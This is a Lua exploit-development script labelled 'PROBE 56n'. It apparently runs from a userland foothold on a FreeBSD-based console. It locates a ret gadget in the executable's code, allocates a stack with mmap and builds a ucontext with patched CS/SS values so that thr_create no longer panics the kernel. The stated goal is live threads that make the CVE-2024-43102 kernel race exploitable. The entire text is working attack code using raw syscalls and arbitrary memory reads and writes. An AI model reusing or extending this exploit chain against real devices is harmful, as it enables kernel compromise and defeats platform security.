-- CRASH_CLASS: HIGH
-- PROBE 56n: thr_create(430) with CS=0x43 fix — decisive test
--
-- Context: thr_create panics kernel because set_mcontext() copies CS=0
-- from zeroed ucontext. ISPL(0)=0 makes trap handler think it's kernel-mode.
-- Fix: set CS=0x43 (user code seg, RPL=3), SS=0x3B (user stack seg, RPL=3).
-- If this works, we get live threads → race conditions → CVE-2024-43102.

print("=== PROBE 56n: THR_CREATE CS=0x43 FIX ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Step 1: Find a ret gadget in eboot .text
print("")
print("--- FINDING RET GADGET ---")
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)
local eboot_lo = safe_rd(info + 0x108)
local eboot_hi = safe_rd(info + 0x10C)
print(string.format("eboot text base: 0x%X_%08X", eboot_hi or 0, eboot_lo or 0))

local ret_gadget = nil
if eboot_lo and eboot_hi then
    local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
    local ok_scan, scan_data = pcall(function()
        return native.read_buffer(eboot_base, 4096)
    end)
    if ok_scan and scan_data then
        for i = 1, #scan_data do
            if scan_data:byte(i) == 0xC3 then
                ret_gadget = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + i - 1))
                print("ret gadget at eboot+" .. string.format("0x%X", i-1) .. " = " .. fmt_addr(ret_gadget))
                break
            end
        end
    else
        print("eboot read failed: " .. tostring(scan_data))
    end
end

if not ret_gadget then
    print("FATAL: no ret gadget found")
    print("canary=" .. to_num(syscall.getpid()))
    print("=== PROBE 56n ABORT ===")
    return
end

-- Step 2: Verify fcall_with_rax still works
print("")
print("--- VERIFY FCALL ---")
local stub = syscall.pipe.fn_addr
local ok_gp, ret_gp = pcall(function() return native.fcall_with_rax(stub, 20) end)
print("fcall_with_rax getpid: ret=" .. tostring(ret_gp))

-- Step 3: Allocate thread stack via mmap
print("")
print("--- ALLOCATE THREAD STACK ---")
local sc_mmap = make_syscall(477)
local ok_stk, new_stack = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local stk_h, stk_l = get_hi_lo(new_stack)
print(string.format("stack: 0x%X_%08X (ok=%s)", stk_h, stk_l, tostring(ok_stk)))

if not ok_stk or stk_h == 0xFFFFFFFF then
    print("FATAL: stack allocation failed")
    print("canary=" .. to_num(syscall.getpid()))
    print("=== PROBE 56n ABORT ===")
    return
end

-- Step 4: Build ucontext with CS=0x43 fix
print("")
print("--- BUILD UCONTEXT ---")

-- Allocate and zero ucontext_t (0x500 bytes to be safe)
local uctx = memory.alloc(0x500)
for i = 0, 0x1FF do
    pcall(function() memory.write_byte(uctx + i, 0) end)
end

-- mcontext starts at uctx + 0x10 on FreeBSD amd64
local mc = to_num(uctx) + 0x10

-- Set RIP = ret gadget (thread will execute 'ret' and exit)
local rg_h, rg_l = get_hi_lo(ret_gadget)
safe_wd(mc + 0xB0, rg_l)
safe_wd(mc + 0xB4, rg_h)

-- Set CS = 0x43 (user code segment with RPL=3)
safe_wd(mc + 0xB8, 0x43)
safe_wd(mc + 0xBC, 0)

-- Set RFLAGS = 0x202 (IF=1, reserved bit 1 = 1)
safe_wd(mc + 0xC0, 0x202)
safe_wd(mc + 0xC4, 0)

-- Set RSP = top of stack - 0x100 (room for alignment)
local sp_l = stk_l + 0x10000 - 0x100
local sp_h = stk_h
safe_wd(mc + 0xC8, sp_l)
safe_wd(mc + 0xCC, sp_h)

-- Set SS = 0x3B (user stack segment with RPL=3)
safe_wd(mc + 0xD0, 0x3B)
safe_wd(mc + 0xD4, 0)

-- Set RBP = RSP (valid frame pointer)
safe_wd(mc + 0x48, sp_l)
safe_wd(mc + 0x4C, sp_h)

-- Set uc_flags to indicate valid mcontext
-- _UC_CPU = 0x04 on FreeBSD
safe_wd(uctx + 0x04, 0x04)  -- uc_flags (at offset +0x04 in sigset variant)

-- Verify key fields
print(string.format("RIP:    0x%08X_%08X", safe_rd(mc + 0xB4) or 0, safe_rd(mc + 0xB0) or 0))
print(string.format("CS:     0x%08X_%08X", safe_rd(mc + 0xBC) or 0, safe_rd(mc + 0xB8) or 0))
print(string.format("RFLAGS: 0x%08X_%08X", safe_rd(mc + 0xC4) or 0, safe_rd(mc + 0xC0) or 0))
print(string.format("RSP:    0x%08X_%08X", safe_rd(mc + 0xCC) or 0, safe_rd(mc + 0xC8) or 0))
print(string.format("SS:     0x%08X_%08X", safe_rd(mc + 0xD4) or 0, safe_rd(mc + 0xD0) or 0))
print(string.format("RBP:    0x%08X_%08X", safe_rd(mc + 0x4C) or 0, safe_rd(mc + 0x48) or 0))

-- Step 5: Prepare TID output
local tid_out = memory.alloc(16)
safe_wq(tid_out, uint64(0))

-- Step 6: CALL THR_CREATE
print("")
print("*** CALLING thr_create(430) ***")
print("*** CS=0x43 SS=0x3B — should prevent kernel panic ***")
print("PRE-CALL canary=" .. to_num(syscall.getpid()))

local sc_thr_create = make_syscall(430)
local ok_tc, ret_tc = pcall(function()
    return sc_thr_create(uint64(to_num(uctx)), uint64(to_num(tid_out)), uint64(0))
end)

-- If we reach here, the kernel didn't panic!
print("*** POST-CALL REACHED ***")
print("thr_create: ok=" .. tostring(ok_tc) .. " ret=" .. tostring(ret_tc))

local new_tid = safe_rq(tid_out)
local tid_num = to_num(new_tid)
print("TID=" .. tid_num .. " (" .. fmt_addr(new_tid) .. ")")

local post_pid = to_num(syscall.getpid())
print("POST canary=" .. post_pid)

-- Step 7: Verify thread
if ok_tc and to_num(ret_tc) == 0 and tid_num > 0 then
    print("")
    print("*** THR_CREATE SUCCEEDED! THREAD IS ALIVE! ***")

    -- Check thread with thr_kill(tid, 0) — signal 0 = existence check
    local sc_thr_kill = make_syscall(433)
    local ok_tk, ret_tk = pcall(function()
        return sc_thr_kill(uint64(tid_num), uint64(0))
    end)
    print("thr_kill(tid=" .. tid_num .. ",sig=0): ok=" .. tostring(ok_tk) .. " ret=" .. tostring(ret_tk))

    -- Try thr_self to see our own TID
    local sc_thr_self = make_syscall(432)
    local self_tid_buf = memory.alloc(16)
    local ok_ts, ret_ts = pcall(function()
        return sc_thr_self(uint64(to_num(self_tid_buf)))
    end)
    local self_tid = safe_rq(self_tid_buf)
    print("thr_self: ok=" .. tostring(ok_ts) .. " ret=" .. tostring(ret_ts) .. " self_tid=" .. to_num(self_tid))

    print("")
    print("*** THREADING IS AVAILABLE! ***")
    print("*** CVE-2024-43102 RACE CONDITION NOW POSSIBLE ***")
else
    print("")
    if not ok_tc then
        print("thr_create pcall failed (process may have crashed or syscall returned error)")
    else
        print("thr_create returned non-zero: " .. tostring(ret_tc))
        print("Thread creation may have failed but kernel didn't panic")
    end
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 56n COMPLETE ===")
